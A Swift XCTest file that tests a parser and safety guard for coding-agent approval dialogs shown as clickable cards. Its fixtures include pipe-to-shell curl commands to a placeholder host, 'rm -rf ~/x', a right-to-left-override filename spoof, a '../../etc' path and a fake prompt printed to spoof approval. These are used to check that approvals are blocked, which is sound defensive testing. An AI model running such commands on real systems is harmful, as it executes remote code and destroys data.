import AppKit
import SwiftUI
import XCTest
@testable import ProsperApp

/// Claude Code Bash permission, read with dch --read from the #475 probe session.
private let bashScreen = """
⏺ I will clean the build tree and rebuild.

──────────────────────────────────────────────────────────────────────────────────────────
 Bash command

   rm -rf .build && swift build -c release
   Clean and rebuild the release products

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don't ask again for rm commands in /Users/probe/proj
   3. No, and tell Claude what to do differently (esc)
"""

/// Claude Code Edit permission with a diff preview (probe session).
private let editScreen = """
──────────────────────────────────────────────────────────────────────────────────────────
 Edit file
 ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  41      func tick() -> [AgentSession]? {
  42 -        let dirs = dirs()
  42 +        let dirs = self.dirs()
  43          let snap = scanner.scan(dirs)
 ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 Do you want to make this edit to AgentIslandModel.swift?
 ❯ 1. Yes
   2. Yes, allow all edits during this session (shift+tab)
   3. No, and tell Claude what to do differently (esc)
"""

/// AskUserQuestion, 4 options plus Claude's two extras (probe session).
private let askFourScreen = """
──────────────────────────────────────────────────────────────────────────────────────────
 ←  ☐ Target  ✔ Submit  →

Which deployment target?

❯ 1. Production
     Live customer traffic, needs a release tag
  2. Staging
     Pre-release environment
  3. Local only
     Docker compose on this Mac
  4. Preview
     A throwaway per-branch deploy
  5. Type something.
──────────────────────────────────────────────────────────────────────────────────────────
  6. Chat about this

Enter to select · ↑/↓ to navigate · Esc to cancel
"""

/// Ordinary output with a numbered list and the idle input box (probe session).
private let ordinaryScreen = """
⏺ Plan:
  1. Add the parser
  2. Wire the controller
  3. Write the tests

──────────────────────────────────────────────────────────────────────────────────────────
❯
──────────────────────────────────────────────────────────────────────────────────────────
  ? for shortcuts
"""

/// codex exec approval: blocked, no numbers (probe session).
private let codexScreen = """
• Running cargo test -p core

  Allow command?

  $ cargo test -p core

  Press enter to confirm or esc to cancel
"""

/// AskUserQuestion with 3 options, written from Claude Code's form layout, with
/// the caret moved to option 2 (the user arrowed down).
private let askThreeScreen = """
────────────────────────────────────────────────
 ←  ☐ Scope  ✔ Submit  →

How far should the refactor go?

  1. Just this file
❯ 2. The whole module
     Includes the tests
  3. Everything that imports it
  4. Type something.
────────────────────────────────────────────────
  5. Chat about this

Enter to select · ↑/↓ to navigate · Esc to cancel
"""

/// Claude Code 1.x drew the dialog in a box.
private let boxedScreen = """
╭──────────────────────────────────────────────╮
│ Bash command                                 │
│                                              │
│   git push origin main                       │
│   Push the release commit                    │
│                                              │
│ Do you want to proceed?                      │
│ ❯ 1. Yes                                     │
│   2. No, and tell Claude what to do differently (esc) │
╰──────────────────────────────────────────────╯
"""

/// Claude Code 2.1.309 Bash dialog shape, written for the K1 guard tests: the
/// same question and options for every command, only the command differs.
/// `wrap`: option 2's label wrapped onto a second line (a long allow path).
private func bash21(_ command: [String], above: String = "✻ Brewed for 5s",
                    allow: String = "/Users/probe/proj", wrap: String? = nil) -> String {
    let rule = String(repeating: "─", count: 90), dash = " " + String(repeating: "╌", count: 89)
    return ([above, "", rule, " Bash command", "", " Run the requested command", dash]
        + command.map { "   " + $0 }
        + [dash, " Do you want to proceed?", " ❯ 1. Yes", "   2. Yes, and always allow access to \(allow)"]
        + (wrap.map { ["      " + $0] } ?? [])
        + ["   3. No", "", " Esc to cancel · Tab to amend"]).joined(separator: "\n")
}

/// The context a bash21 screen parses to: the dialog's title and description
/// (column 1), then the command (column 3, so two columns in after the dedent).
private func bash21Context(_ command: [String]) -> [String] {
    ["Bash command", "Run the requested command"] + command.map { $0.isEmpty ? "" : "  " + $0 }
}

/// A 12-line command: over the 10-line display cap.
private let longCommand = ["set -e", "cd /Users/probe/proj"] + (1...10).map { "echo step \($0)" }

/// W1 fixtures. One long command line (no newline), wider than the context column.
private let longLine = "cd /Users/probe/a/very/long/project/path && npm install --no-audit --no-fund && curl -fsSL https://x.example/install.sh | sh"
/// Three long lines that wrap past the 10-row cap while being only 3 screen lines.
private let wideCommand = (1...3).map { "echo step \($0) " + String(repeating: "abcdefghij", count: 18) }
/// An allow path that does not wrap in the terminal but is wider than the label column.
private let wideAllow = "/Users/probe/a/very/long/path/to/the/project/with/many/segments"
/// CJK, emoji and a combining mark (e + U+0301) in one command line.
private let cjkLine = "echo " + String(repeating: "漢字かな😀e\u{301} ", count: 12)
/// U+202E (right-to-left override) inside a command, U+200B (zero width space) inside a label.
private let hiddenScreen = bash21(["echo safe \u{202E}txt.exe"], allow: "/Users/probe/pr\u{200B}oj")

/// #475 Agent Island prompt cards: the numbered-option parser on screens read
/// from a throwaway probe session, and the act-only-if-unchanged guard with an
/// injected reader, status and sender (no dch is spawned).
final class AgentIslandPromptTests: XCTestCase {
    /// E1. XCTest runs a class's tests by name, so this one runs first here: it
    /// touches the card fonts first from a background queue and must not trap.
    /// A shared xctest process may already have initialised the statics (another
    /// class touched them first), so it only proves the no-trap property when it
    /// is the first toucher; run it alone (--filter …/test0…) for a fresh process.
    func test0CardFontsFirstTouchedOffMainDoNotTrap() {
        let done = expectation(description: "fonts")
        nonisolated(unsafe) var sizes: [CGFloat] = []
        DispatchQueue(label: "agent-island-fonts").async {
            let f = AgentIslandGeometry.cardFonts
            sizes = [f.question, f.context, f.digit, f.label, f.hint, f.detail].map { CTFontGetSize($0) }
            done.fulfill()
        }
        wait(for: [done], timeout: 30)
        XCTAssertEqual(sizes, [13, 11, 11, 12, 10, 11])
    }

    private func prompt(_ screen: String, file: StaticString = #filePath, line: UInt = #line) throws -> AgentPrompt {
        try XCTUnwrap(AgentPrompt.parse(screen), file: file, line: line)
    }

    // MARK: - Parser

    func testBashPermission() throws {
        let p = try prompt(bashScreen)
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, ["Bash command", "  rm -rf .build && swift build -c release",
                                   "  Clean and rebuild the release products"],
                       "inside the dialog's top rule, blank lines dropped, common indent removed")
        XCTAssertEqual(p.options, [
            AgentPromptOption(digit: 1, label: "Yes", hint: nil),
            AgentPromptOption(digit: 2, label: "Yes, and don't ask again for rm commands in /Users/probe/proj", hint: nil),
            AgentPromptOption(digit: 3, label: "No, and tell Claude what to do differently", hint: "esc"),
        ])
        XCTAssertEqual(p.options.enumerated().map { $1.style(first: $0 == 0) }, [.accent, .plain, .deny])
        XCTAssertEqual(AgentPrompt.card(screen: bashScreen), .prompt(p))
    }

    func testEditPermissionWithDiffPreview() throws {
        let p = try prompt(editScreen)
        XCTAssertEqual(p.question, "Do you want to make this edit to AgentIslandModel.swift?")
        XCTAssertEqual(p.context, ["Edit file", " 41      func tick() -> [AgentSession]? {", " 42 -        let dirs = dirs()",
                                   " 42 +        let dirs = self.dirs()", " 43          let snap = scanner.scan(dirs)"],
                       "both dashed diff frames are passed; the top rule ends the context")
        XCTAssertEqual(p.options.map(\.label), ["Yes", "Yes, allow all edits during this session",
                                                "No, and tell Claude what to do differently"])
        XCTAssertEqual(p.options.map(\.hint), [nil, "shift+tab", "esc"])
    }

    func testAskUserQuestionWithFourOptions() throws {
        let p = try prompt(askFourScreen)
        XCTAssertEqual(p.question, "Which deployment target?")
        XCTAssertEqual(p.context, ["←  ☐ Target  ✔ Submit  →"])
        XCTAssertEqual(p.options.map(\.digit), Array(1...6))
        XCTAssertEqual(p.options.map(\.label), ["Production", "Staging", "Local only", "Preview",
                                                "Type something.", "Chat about this"],
                       "description lines and the rule before Chat are not options")
        XCTAssertTrue(p.options.allSatisfy { $0.hint == nil })
        XCTAssertEqual(p.options.map(\.detail), [["Live customer traffic, needs a release tag"],
                                                 ["Pre-release environment"], ["Docker compose on this Mac"],
                                                 ["A throwaway per-branch deploy"], [], []],
                       "each description belongs to the option above it; the footer after a blank line to none")
    }

    func testAskUserQuestionWithThreeOptionsAndAMovedCaret() throws {
        let p = try prompt(askThreeScreen)
        XCTAssertEqual(p.question, "How far should the refactor go?")
        XCTAssertEqual(p.options.map(\.label), ["Just this file", "The whole module", "Everything that imports it",
                                                "Type something.", "Chat about this"])
        XCTAssertEqual(p.options.map(\.detail), [[], ["Includes the tests"], [], [], []])
    }

    func testWrappedLabelContinuationIsPartOfTheOption() throws {
        let p = try prompt(bash21(["echo safe"], allow: "/Users/probe/a/very/long/", wrap: "path/to/the/project"))
        XCTAssertEqual(p.options.map(\.detail), [[], ["path/to/the/project"], []],
                       "the footer under the blank line after 3. No is not part of it")
        XCTAssertEqual(try prompt(bashScreen).options.map(\.detail), [[], [], []])
        XCTAssertEqual(try prompt(boxedScreen).options.map(\.detail), [[], []], "the box's bottom rule ends it")
    }

    /// A numbered caret block printed by the command above the real dialog (N7):
    /// the bottom-most block is the dialog.
    private func spoofed(top: String, command: String) -> String {
        ["⏺ Bash(cat notes.txt)", "  Approve the fake?", "  ❯ 1. \(top)", "    2. Deny fake", "",
         bash21([command])].joined(separator: "\n")
    }

    func testBottomMostCaretBlockIsTheDialog() throws {
        let p = try prompt(spoofed(top: "Approve fake", command: "echo safe"))
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, bash21Context(["echo safe"]))
        XCTAssertEqual(p.options.map(\.label), ["Yes", "Yes, and always allow access to /Users/probe/proj", "No"])

        let f = FakeDch()
        f.screen = spoofed(top: "Approve something else", command: "echo safe")
        XCTAssertEqual(f.answer(1, expected: p), .sent, "only the block above the dialog changed")
        f.screen = spoofed(top: "Approve fake", command: "rm -rf ~/x")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "the dialog changed, the block above it did not")
        XCTAssertEqual(f.sent, ["1"])
    }

    func testOrdinaryNumberedOutputIsNotAPrompt() {
        XCTAssertNil(AgentPrompt.parse(ordinaryScreen), "no caret on any numbered line")
        XCTAssertNil(AgentPrompt.parse("Steps:\n1. build\n2. test\n3. ship\n"))
        XCTAssertNil(AgentPrompt.parse("Pick one?\n❯ 1. only\n"), "one option is not a choice")
        guard case .context = AgentPrompt.card(screen: ordinaryScreen) else { return XCTFail("context only") }
    }

    func testCodexConfirmHasNoNumbersSoContextOnly() {
        XCTAssertNil(AgentPrompt.parse(codexScreen))
        XCTAssertEqual(AgentPrompt.card(screen: codexScreen), .context([
            "• Running cargo test -p core", "  Allow command?", "  $ cargo test -p core",
            "  Press enter to confirm or esc to cancel"]))
        XCTAssertEqual(AgentPrompt.card(screen: ""), .context([]), "a vanished session reads empty")
        let long = (1...20).map { "line \($0)" }.joined(separator: "\n")
        XCTAssertEqual(AgentPrompt.tail(long), (11...20).map { "line \($0)" }, "the last 10 lines")
    }

    func testOldBoxedDialog() throws {
        let p = try prompt(boxedScreen)
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, ["Bash command", "  git push origin main", "  Push the release commit"])
        XCTAssertEqual(p.options, [AgentPromptOption(digit: 1, label: "Yes", hint: nil),
                                   AgentPromptOption(digit: 2, label: "No, and tell Claude what to do differently",
                                                     hint: "esc")])
    }

    func testMalformedListsParseAsNothing() {
        let q = "Do you want to proceed?\n"
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. Yes\n  3. No\n"), "a gap in the numbering")
        XCTAssertNil(AgentPrompt.parse(q + "  2. Yes\n❯ 3. No\n"), "does not start at 1")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. Yes\n❯ 2. No\n"), "two carets")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. [ ] Prod\n  2. [✔] Staging\n"), "multi-select: a digit toggles")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. ☐ Prod\n  2. ☐ Staging\n"))
        XCTAssertNil(AgentPrompt.parse("❯ 1. Yes\n  2. No\n"), "no question line")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. Yes\na\nb\nc\nd\ne\n  2. No\n"), "options too far apart")
        XCTAssertNil(AgentPrompt.option("1.5 GB free"))
        XCTAssertNil(AgentPrompt.option("10. ten"), "one keystroke per click: 1-9 only")
        XCTAssertNil(AgentPrompt.option("0. zero"))
        XCTAssertNil(AgentPrompt.option("١. Arabic one"))
    }

    func testHintsAreKeysOnly() {
        XCTAssertEqual(AgentPrompt.splitHint("No (esc)").1, "esc")
        XCTAssertEqual(AgentPrompt.splitHint("Yes, allow all edits (shift+tab)").0, "Yes, allow all edits")
        XCTAssertEqual(AgentPrompt.splitHint("Local (docker)").1, nil, "a word in parentheses stays in the label")
        XCTAssertEqual(AgentPrompt.splitHint("Staging (pre-release)").0, "Staging (pre-release)")
        XCTAssertEqual(AgentPromptOption(digit: 1, label: "No", hint: nil).style(first: true), .deny, "deny wins")
        XCTAssertEqual(AgentPromptOption(digit: 2, label: "Not now", hint: nil).style(first: false), .plain)
    }

    // MARK: - Guard

    private final class FakeDch: @unchecked Sendable {
        var screen = bashScreen
        var status = "blocked\n"
        var sent: [String] = []
        var reads = 0
        let key = AgentSessionKey(dir: "/d", name: "s")
        var io: AgentPromptIO {
            AgentPromptIO(read: { [self] in XCTAssertEqual($0, key); reads += 1; return screen },
                          status: { [self] _ in status },
                          send: { [self] in XCTAssertEqual($0, key); sent.append($1) })
        }
        func answer(_ digit: Int, expected: AgentPrompt) -> AgentPromptAnswer {
            AgentPrompt.answer(key, digit: digit, expected: expected, io: io)
        }
    }

    func testUnchangedPromptSendsExactlyOneDigit() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        XCTAssertEqual(f.answer(2, expected: p), .sent)
        XCTAssertEqual(f.sent, ["2"], "the digit alone: no Enter, one keystroke")
        XCTAssertEqual(f.reads, 1, "the screen is re-read at click time")

        let ask = FakeDch()
        ask.screen = askThreeScreen
        let q = try prompt(askThreeScreen)
        ask.screen = askThreeScreen.replacingOccurrences(of: "❯ 2.", with: "  2.")
            .replacingOccurrences(of: "  3. Every", with: "❯ 3. Every")
        XCTAssertEqual(ask.answer(1, expected: q), .sent, "the caret moving is not a different prompt")
        XCTAssertEqual(ask.sent, ["1"])
    }

    func testChangedQuestionSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        f.screen = bashScreen.replacingOccurrences(of: "Do you want to proceed?", with: "Do you want to continue?")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testChangedOptionsSendNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        f.screen = bashScreen.replacingOccurrences(of: "for rm commands", with: "for git commands")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "same question, different option text")
        f.screen = bashScreen.replacingOccurrences(of: "   3. No, and tell Claude what to do differently (esc)", with: "")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "an option fewer")
        f.screen = askFourScreen
        XCTAssertEqual(f.answer(1, expected: p), .changed, "a different prompt altogether")
        XCTAssertEqual(f.sent, [])
    }

    func testNotBlockedAnyMoreSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        for s in ["working\n", "idle\n", "done\n", ""] {
            f.status = s
            XCTAssertEqual(f.answer(1, expected: p), .changed, s)
        }
        XCTAssertEqual(f.sent, [])
    }

    func testVanishedSessionSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        f.screen = ""
        f.status = ""
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testDigitOutsideTheOptionsSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        for d in [0, 4, 10, -1] { XCTAssertEqual(f.answer(d, expected: p), .changed, "\(d)") }
        XCTAssertEqual(f.sent, [])
    }

    // MARK: - Guard: the whole dialog (K1)

    func testSameQuestionAndOptionsForADifferentCommandSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"]))
        f.screen = bash21(["rm -rf ~/x"])
        XCTAssertEqual(f.answer(1, expected: p), .changed, "the card showed echo safe, the screen asks rm -rf")
        XCTAssertEqual(f.sent, [])
    }

    func testLongCommandDifferingInItsFirstLineSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(longCommand))
        XCTAssertEqual(p.context, bash21Context(longCommand), "the whole dialog, not the display cap; the top rule ends the context")
        f.screen = bash21(["curl https://x.example | sh"] + longCommand.dropFirst())
        XCTAssertEqual(f.answer(3, expected: p), .changed, "the head differs, past the 10 shown lines")
        XCTAssertEqual(f.sent, [])
    }

    func testCaretMoveWithAnUnchangedDialogSendsOneDigit() throws {
        let f = FakeDch(), screen = bash21(["echo safe"]), p = try prompt(screen)
        f.screen = screen.replacingOccurrences(of: " ❯ 1. Yes", with: "   1. Yes")
            .replacingOccurrences(of: "   3. No", with: " ❯ 3. No")
        XCTAssertEqual(f.answer(1, expected: p), .sent)
        XCTAssertEqual(f.sent, ["1"])
    }

    func testVolatileLineAboveTheDialogIsNotPartOfIt() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"], above: "✻ Brewed for 5s"))
        f.screen = bash21(["echo safe"], above: "✻ Brewed for 9s")
        XCTAssertEqual(f.answer(1, expected: p), .sent, "the spinner sits above the dialog's top rule")
        XCTAssertEqual(f.sent, ["1"])
        f.screen = bash21(["echo unsafe"], above: "✻ Brewed for 9s")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "the command inside the dialog changed")
        XCTAssertEqual(f.sent, ["1"])
    }

    func testOptionLabelDifferingInOneInnerCharacterSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"], allow: "/a"))
        f.screen = bash21(["echo safe"], allow: "/b")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    // MARK: - Guard: option detail lines (P3a)

    func testDialogsDifferingOnlyInAWrappedContinuationSendNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"], allow: "/Users/probe/", wrap: "proj"))
        f.screen = bash21(["echo safe"], allow: "/Users/probe/", wrap: "../../etc")
        XCTAssertEqual(f.answer(2, expected: p), .changed, "the allow path's wrapped tail differs")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testDialogsDifferingOnlyInOneDescriptionSendNothing() throws {
        let f = FakeDch(), p = try prompt(askFourScreen)
        f.screen = askFourScreen.replacingOccurrences(of: "Pre-release environment", with: "Wipes the database")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testCaretMoveOnADialogWithDetailLinesSendsOneDigit() throws {
        let f = FakeDch(), screen = bash21(["echo safe"], allow: "/Users/probe/", wrap: "proj"), p = try prompt(screen)
        f.screen = screen.replacingOccurrences(of: " ❯ 1. Yes", with: "   1. Yes")
            .replacingOccurrences(of: "   2. Yes,", with: " ❯ 2. Yes,")
        XCTAssertEqual(f.answer(2, expected: p), .sent)
        let ask = FakeDch(), q = try prompt(askFourScreen)
        ask.screen = askFourScreen.replacingOccurrences(of: "❯ 1. Production", with: "  1. Production")
            .replacingOccurrences(of: "  4. Preview", with: "❯ 4. Preview")
        XCTAssertEqual(ask.answer(4, expected: q), .sent)
        XCTAssertEqual(f.sent + ask.sent, ["2", "4"], "exactly one digit each")
    }

    func testOverCapCardShowsTheHeadAndAMarkerAndOnlyDenyIsEnabled() throws {
        let p = try prompt(bash21(longCommand))
        XCTAssertTrue(p.isOverCap)
        XCTAssertEqual(p.shownContext, Array(bash21Context(longCommand).prefix(10)) + ["… 4 more lines"],
                       "the head is shown, the tail is counted")
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true], "approve options off, No on")
        let f = FakeDch()
        f.screen = bash21(longCommand)
        XCTAssertEqual(f.answer(1, expected: p), .changed, "a disabled option never sends")
        XCTAssertEqual(f.answer(3, expected: p), .sent)
        XCTAssertEqual(f.sent, ["3"])

        let short = try prompt(bash21(["echo safe"]))
        XCTAssertFalse(short.isOverCap)
        XCTAssertEqual(short.shownContext, short.context)
        XCTAssertTrue(short.options.allSatisfy { short.isEnabled($0) })
    }

    // MARK: - W1: measured rows, too wide, hidden characters

    private typealias G = AgentIslandGeometry

    private func assertFits(_ rows: [String], _ f: CTFont, _ w: CGFloat, _ what: String,
                            file: StaticString = #filePath, line: UInt = #line) {
        for r in rows {
            XCTAssertLessThanOrEqual(G.width(r, f), w - G.fitMargin, "\(what): \(r)", file: file, line: line)
        }
    }

    func testLongSingleLineCommandWrapsIntoMeasuredRowsAndStaysApprovable() throws {
        let p = try prompt(bash21([longLine])), l = p.layout
        XCTAssertEqual(p.context, bash21Context([longLine]))
        XCTAssertGreaterThan(G.width(longLine, G.contextFont), G.cardContextWidth, "the fixture is wider than the column")
        XCTAssertGreaterThan(l.context.count, 3)
        XCTAssertEqual(l.context.dropFirst(2).joined(), "  " + longLine, "all of it is shown, across rows")
        assertFits(l.context, G.contextFont, G.cardContextWidth, "context row")
        XCTAssertFalse(l.isOverCap)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, true, true])
        XCTAssertEqual(l.caption, [])
    }

    func testCommandWrappingPastEightRowsIsDenyOnly() throws {
        let p = try prompt(bash21(wideCommand)), l = p.layout
        XCTAssertLessThanOrEqual(p.context.count, AgentPrompt.maxContext, "3 screen lines, under the old line cap")
        XCTAssertTrue(l.isOverCap)
        XCTAssertEqual(l.context.count, AgentPrompt.maxContext + 1)
        // No force-unwrap (QA #310 D1): an empty context fails here instead of trapping xctest.
        XCTAssertEqual(l.context.last?.hasPrefix("… "), true, "\(l.context)")
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true])
        XCTAssertEqual(l.caption.joined(), AgentCardLayout.tooLongCaption)
    }

    func testWideLabelDisablesThatOptionOnly() throws {
        let p = try prompt(bash21(["echo safe"], allow: wideAllow)), l = p.layout
        XCTAssertEqual(p.options[1].detail, [], "one terminal row, no wrapped continuation")
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, false, true], "Yes and No stay on")
        XCTAssertEqual(l.caption.joined(), AgentCardLayout.tooLongCaption)
        XCTAssertGreaterThan(l.labels[1].count, 1, "shown in full across rows, not cut")
        XCTAssertEqual(l.labels[1].joined(), p.options[1].label)

        // A too-wide detail line does it too; a too-wide No does not.
        let d = try prompt(bash21(["echo safe"], allow: "/a", wrap: wideAllow + wideAllow))
        XCTAssertEqual(d.options.map { d.isEnabled($0) }, [true, false, true])
        let no = AgentPrompt(question: "Proceed?", context: [], options: [
            AgentPromptOption(digit: 1, label: "Yes", hint: nil),
            AgentPromptOption(digit: 2, label: "No, " + wideAllow + wideAllow, hint: "esc")])
        XCTAssertEqual(no.options.map { no.isEnabled($0) }, [true, true])
        XCTAssertEqual(no.layout.caption, [], "nothing to approve was hidden")
    }

    func testCJKAndEmojiAreMeasuredNotCounted() throws {
        let p = try prompt(bash21([cjkLine])), rows = Array(p.layout.context.dropFirst(2))   // title, description rows
        XCTAssertEqual(p.context, bash21Context([cjkLine.trimmingCharacters(in: .whitespaces)]))
        XCTAssertEqual(rows.joined(), p.context.last)
        assertFits(rows, G.contextFont, G.cardContextWidth, "CJK row")
        // Greedy on measured width: no row could take the next character.
        for (r, next) in zip(rows, rows.dropFirst()) {
            XCTAssertFalse(G.fits(r + String(next.prefix(1)), G.contextFont, G.cardContextWidth), r)
        }
        // Counting one ASCII cell per character would give fewer rows.
        let counted = Int((CGFloat(cjkLine.count) * G.width("x", G.contextFont) / (G.cardContextWidth - G.fitMargin)).rounded(.up))
        XCTAssertGreaterThan(rows.count, counted)
        XCTAssertFalse(rows.contains { $0.unicodeScalars.first == "\u{301}" }, "a combining mark stays on its base")
    }

    func testHiddenCharactersDisableApproveAndShowEscaped() throws {
        let p = try prompt(hiddenScreen), l = p.layout
        XCTAssertTrue(p.context.joined().contains("\u{202E}"), "parsed raw")
        XCTAssertTrue(p.hasHiddenCharacters)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true])
        XCTAssertTrue(l.context.joined().contains("echo safe ⟨U+202E⟩txt.exe"), "\(l.context)")
        XCTAssertTrue(l.labels[1].joined().contains("/Users/probe/pr⟨U+200B⟩oj"), "\(l.labels)")
        XCTAssertFalse((l.context + l.labels.joined()).joined().unicodeScalars.contains(where: AgentPrompt.isHidden))
        XCTAssertEqual(l.caption.joined(), AgentCardLayout.hiddenCaption)
        XCTAssertEqual(AgentPrompt.visible("a\tb\u{7}\u{9B}\u{FEFF}"), "a⟨U+0009⟩b⟨U+0007⟩⟨U+009B⟩⟨U+FEFF⟩")
        XCTAssertEqual(AgentPrompt.visible("漢字 😀 é"), "漢字 😀 é", "printable text renders literally")
        let q = AgentPrompt(question: "Proceed\u{2066}?", context: [], options: p.options)
        XCTAssertEqual(q.options.map { q.isEnabled($0) }, [false, false, true], "in the question too")

        // Both over cap and hidden: the hidden-character caption wins.
        let both = try prompt(bash21(wideCommand + ["x\u{200D}y"]))
        XCTAssertEqual(both.layout.caption.joined(), AgentCardLayout.hiddenCaption)

        // The identity stays the raw text: the escaped spelling on screen is a different dialog.
        let f = FakeDch()
        f.screen = hiddenScreen.replacingOccurrences(of: "\u{202E}", with: "⟨U+202E⟩")
        XCTAssertEqual(f.answer(3, expected: p), .changed)
        f.screen = hiddenScreen
        XCTAssertEqual(f.answer(3, expected: p), .sent)
        XCTAssertEqual(f.sent, ["3"])
    }

    /// W1e: every lineLimit(1) Text in the card renders a string that, measured
    /// with its font, fits its width; so no edit can bring back a silent ellipsis.
    func testEveryOneLineTextInTheCardFitsItsWidth() throws {
        let screens = [bashScreen, editScreen, askFourScreen, askThreeScreen, boxedScreen, bash21(longCommand),
                       bash21([longLine]), bash21(wideCommand), bash21(["echo safe"], allow: wideAllow),
                       bash21(["echo safe"], allow: "/a", wrap: wideAllow + wideAllow), bash21([cjkLine]), hiddenScreen]
        for screen in screens {
            let p = try prompt(screen), l = p.layout
            assertFits(l.question + l.caption, G.questionFont, G.cardInner, "question/caption")
            assertFits(l.context, G.contextFont, G.cardContextWidth, "context")
            for (i, o) in p.options.enumerated() {
                assertFits(l.labels[i], G.labelFont, AgentCardLayout.labelWidth(o), "label")
                assertFits(l.details[i], G.detailFont, AgentCardLayout.detailWidth(o), "detail")
            }
        }
        let long = (bash21([longLine, cjkLine] + wideCommand) + "\n\n").replacingOccurrences(of: "❯", with: " ")
        assertFits(AgentCardLayout.contextRows(AgentPrompt.tail(long)).rows, G.contextFont, G.cardContextWidth, "tail")
        assertFits([AgentPromptCardView.changedText], G.questionFont, G.cardInner, "changed")
    }

    func testAnswerRefusesADisabledDigitForEachReason() throws {
        let cases: [(String, String, Int)] = [("width", bash21(["echo safe"], allow: wideAllow), 2),
                                              ("hidden", hiddenScreen, 1),
                                              ("over cap by wrapped rows", bash21(wideCommand), 1)]
        for (why, screen, digit) in cases {
            let f = FakeDch(), p = try prompt(screen)
            f.screen = screen
            XCTAssertFalse(p.isEnabled(p.options[digit - 1]), why)
            XCTAssertEqual(f.answer(digit, expected: p), .changed, why)
            XCTAssertEqual(f.answer(3, expected: p), .sent, "\(why): No still answers")
            XCTAssertEqual(f.sent, ["3"], why)
        }
    }

    // MARK: - W1-perf: the layout cache

    /// Each test owns its cache (E2): no other test, and no warm block an earlier
    /// controller test left on its queue, can touch these counts.
    func testASecondLayoutOfAnEqualPromptMeasuresNothing() throws {
        let c = AgentCardLayoutCache()
        let p = try prompt(bash21([longLine, cjkLine])), lines = [longLine + " context-only", cjkLine]
        _ = p.layout(in: c)
        XCTAssertEqual(c.builds, 2, "the layout and its context rows, each measured once")
        _ = AgentIslandGeometry.cardHeight(.context(lines), in: c)
        let before = c.builds
        let q = try prompt(bash21([longLine, cjkLine]))   // equal, not the same value
        _ = q.layout(in: c)
        _ = AgentIslandGeometry.cardHeight(.prompt(q), in: c)
        _ = AgentIslandGeometry.cardHeight(.context(lines), in: c)
        XCTAssertEqual(c.builds, before, "an equal prompt or context hashes, it does not measure")
    }

    func testTheCacheStaysBounded() throws {
        let c = AgentCardLayoutCache()
        for i in 0..<(AgentCardLayoutCache.bound + 8) { _ = try prompt(bash21(["echo bound \(i)"])).layout(in: c) }
        XCTAssertLessThanOrEqual(c.count, 2 * AgentCardLayoutCache.bound, "two tables, each bounded")
        XCTAssertLessThan(c.count, 2 * (AgentCardLayoutCache.bound + 8), "cleared past the bound")
    }

    func testCachedAndFreshLayoutsAgree() throws {
        for screen in [bash21(wideCommand), hiddenScreen, bash21(["echo safe"], allow: wideAllow)] {
            let c = AgentCardLayoutCache(), p = try prompt(screen)
            _ = p.layout(in: c)
            let cached = p.layout(in: c), fresh = AgentCardLayout(p, cache: AgentCardLayoutCache())
            XCTAssertEqual(c.builds, 2, "the second read was a hit")
            XCTAssertEqual(cached, fresh)
            XCTAssertEqual(p.options.map(cached.isEnabled), p.options.map(fresh.isEnabled))
            XCTAssertEqual(cached.caption, fresh.caption)
            XCTAssertFalse(fresh.caption.isEmpty, "each fixture blocks approve")
        }
    }

    /// The #478 class: the warm call and answer run on a real background queue.
    func testWarmAndAnswerRunOffMain() throws {
        let screen = bash21([longLine + " off-main"]), p = try prompt(screen), f = FakeDch()
        f.screen = screen
        AgentCardLayoutCache.shared.removeAll()
        let done = expectation(description: "background")
        nonisolated(unsafe) var result: (main: Bool, height: CGFloat, answer: AgentPromptAnswer)?
        DispatchQueue(label: "agent-island-test").async {
